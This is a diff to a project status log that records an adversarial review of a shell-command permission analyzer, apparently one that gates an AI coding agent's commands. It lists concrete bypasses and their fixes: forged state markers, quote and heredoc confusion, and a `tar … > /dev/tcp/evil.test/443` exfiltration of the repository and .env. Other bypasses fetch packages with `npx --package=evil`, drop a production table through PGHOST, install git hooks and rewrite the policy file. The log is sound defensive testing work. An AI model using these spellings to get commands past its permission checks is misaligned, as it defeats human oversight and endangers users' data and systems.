@@ -503,6 +503,86 @@ Q98 opened and implemented under the recommended default, awaiting confirmation)
   run 234/234**, serial run 234/234, metamorphic/property suite 8/8, attack corpora 200,334 commands → 40 ALLOW
   (the identical known set: three `@HOME@` placeholders the fixtures never expand, and ordinary development
   commands the attack files carry as decoys), proportionality 7/44 (16%) and 13/73 (18%) — both unchanged.
+  **EXIT REVIEW 7 (2026-09-24, HEAD 203ba67) — FAILED. 24 adversarial lenses, 730 agents, 45M subagent tokens.**
+  `pass: false`. 157 findings survived three independent refuters each (one of which had to RE-RUN the command
+  through the evaluator): **37 CRITICAL and 56 HIGH unauthorized ALLOW**, 17 lower-severity ALLOW, 8 floor
+  crossings and 39 proportionality defects. **`newClasses: 0`** — the seventh consecutive review to produce no
+  architectural class the frozen eleven cannot express.
+
+  TWO THINGS ABOUT THAT NUMBER ARE RECORDED HONESTLY. First, 100 of the 730 agents FAILED on the account's weekly
+  usage limit, all of them in the Classify phase, so `newClasses: 0` covers the findings whose classification
+  completed and not the whole set; the class list was not fully re-tested by this review. Second, this review was
+  three times the size of review 6 and its verifiers executed every claim, which is why it found what six earlier
+  reviews did not. A bigger instrument is not a regression in the artifact; it is a measurement of how far the
+  previous instruments reached.
+
+  The CRITICAL and HIGH findings were closed by ROOT CAUSE, not by spelling. The ones that say something general:
+
+  - **A STATE MARKER MUST BE UNFORGEABLE.** The analyzer injects markers into the segment stream and the control
+    plane matches them with ordinary regexes. They were plain words, so a COMMAND could spell one:
+    `define-function git; git push origin main` made the analyzer believe `git` was a locally defined function
+    whose body it had already read, and the real push was classified read-only — ALLOW. The same forgery reached
+    `psql`, `aws`, `terraform`, `vault` and `argocd`, i.e. through absolute core denies. Two locks now: every
+    marker carries a NUL-delimited sentinel, and every byte entering the analyzer from outside has that sentinel
+    mangled out.
+  - **`$'…'` IS AN ANSI-C STRING, and a backslash escapes inside it.** Read as an ordinary single-quoted string,
+    `echo $'\''` left the splitter believing it was inside a quote for the rest of the line; everything after it
+    collapsed into one `echo`-headed segment, so every DENY spelled after it was ALLOW — the trust store,
+    `curl … | sh`, a production database.
+  - **THE COMMENT RULE HAD A SIBLING READER, AND THE FIX LANDED AT ONE OF THEM.** Exit review 6 widened the
+    splitter's word boundary and left `stripComment` on the narrow whitespace test, so `echo a;#<<true` in a
+    script or a hook opened a phantom heredoc that swallowed the next line. In `.git/hooks/pre-commit` that turns
+    an ordinary `git commit` into a remote push. This is the meta-defect this repository has met before.
+  - **`/dev/tcp/HOST/PORT` IS NOT A FILE.** bash intercepts the pathname in its own redirection code and calls
+    connect(2), so `tar czf - . > /dev/tcp/evil.test/443` ships the whole repository — `.git` and `.env` included
+    — with no network binary anywhere on the line, and the analyzer discarded the target as a device sink.
+  - **A DEVICE IS A PROPERTY OF THE RESOLVED PATH.** `/dev/../Users/me/.zshrc` is a home file; a nine-character
+    prefix had been turning an absolute deny into ALLOW for any path on the machine.
+  - **A DESTINATION NAMED BY A FLAG IS A DESTINATION.** Every bundler's own output flag was unread, so
+    `esbuild --outfile=.git/hooks/pre-commit` installed a hook, `--outfile=control-plane/permissions/matchers.md`
+    rewrote the policy that decides every later verdict, and `vite --outDir .harness/runtime` wrote runtime state
+    the kernel alone may write.
+  - **GIT'S PATHSPEC NEEDS NO `--`.** `git checkout HEAD~1 control-plane/…` and `git checkout origin/evil
+    .harness` were ALLOW while the identical act with two extra characters was an absolute deny.
+  - **A GUARD THAT TESTS THE HEAD MUST RE-RUN AFTER THE HEAD CHANGES.** One wrapper hid the npx acquisition
+    guard: `env npx --package=evil -c "tsc --version"` fetched and ran an arbitrary package while the kernel
+    classified the decoy.
+  - **A PRODUCER'S ARGUMENTS ARE PART OF ITS COMMAND.** npm appends what follows `--` to the script body, so
+    `npm run build -- deploy` really runs `make build deploy`; only the manifest string was resolved.
+  - **THE ENVIRONMENT IS FOUND WHERE THE COMMAND STARTS.** `export PGHOST=prod-db… && psql -c 'DROP TABLE users'`
+    was ALLOW while the one-segment spelling was an absolute deny, because the target-selecting names were absent
+    from the execution-environment vocabulary and the database resolver was the one resolver that did not read
+    the environment at all.
+  - **THE TARGET IS A PROPERTY OF THE TOOL,** in three more forms: a capability not enrolled cannot be
+    re-targeted, an engine bound by `podman system connection` or `docker buildx create --driver remote` is an
+    engine, and a signal's target is a VALUE rather than a suffix (`docker --context staging-run run` lost its
+    own verb).
+
+  **PROPORTIONALITY WAS A THIRD OF THE REVIEW, and is treated as the same seriousness.** `cp /tmp/foo.txt .` was
+  an absolute core deny because the current directory contains `.harness`; `rm -rf node_modules` was refused
+  outright because `node_modules/.bin` sits below it; `grep -rn 'NODE_OPTIONS=' .` — reading your own repository
+  for the name of a variable — was refused because a binding is matched anywhere on the line. The statements:
+  writing ONE named file into the repository root is not a write of its protected subtrees, a DELETE is not a
+  write into (except of EGO's own governance tree, which stays denied), a search pattern is data, and a value
+  that cannot name a program does not change what runs.
+
+  **VALIDATION AT HEAD 7e08564, FROM A COLD STATE** (`~/.ego` removed first): typecheck PASSED, lint PASSED,
+  FIRST cold parallel run 234/234, serial run 234/234, metamorphic/property suite 8/8, proportionality 13/73
+  (18%, unchanged — the 13 are the accepted UNKNOWN_PRODUCER task runners). The in-repo cross-product now asserts
+  **11,645** (class, spelling, transformation, producer) combinations, up from 4,395: 34 root semantic classes,
+  121 canonical spellings, 87 transformations, 1,222 producer-carried variants and 98 ordinary commands.
+
+  **THE 200,334-COMMAND ATTACK CORPORA COULD NOT BE RE-RUN AT THIS HEAD, and that is itself a finding.** Those
+  files lived in a session temporary directory, which has since been cleaned; the harness and its inputs are
+  gone. A validation gate that lives in `/tmp` is not a gate. The permanent replacement is the in-repo
+  cross-product above, which is generated rather than accumulated and grows by one line per transformation.
+
+  **PHASE 1 IS NOT CLOSED.** Six floor crossings from this review remain open as ASK where DENY is deserved —
+  `oc --context <external> delete project`, `mysqladmin -h <prod>`, `clickhouse client --host <prod>`, a
+  service-scoped emulator endpoint that does not make another service local (`AWS_ENDPOINT_URL_S3=…localhost aws
+  iam delete-user`, `PUBSUB_EMULATOR_HOST=… gcloud compute instances delete`), and a brace group piped into a
+  shell. Each is contained by the human gate; none is an unauthorized ALLOW. They are recorded in
+  `docs/architecture/phase-1-residuals.md` and a further fresh review is required.
 - INDEPENDENT-AGENT REVIEW: IN PROGRESS — rounds 1–15 plus challenges of the contract (22, 41, 37, 37, 24
   confirmed). **Resolution itself became the contract on 2026-09-22**, after challenge 5 showed that a producer's
   own parser gap was routed into the single state that fails open: "not parsed" and "not present" were the same
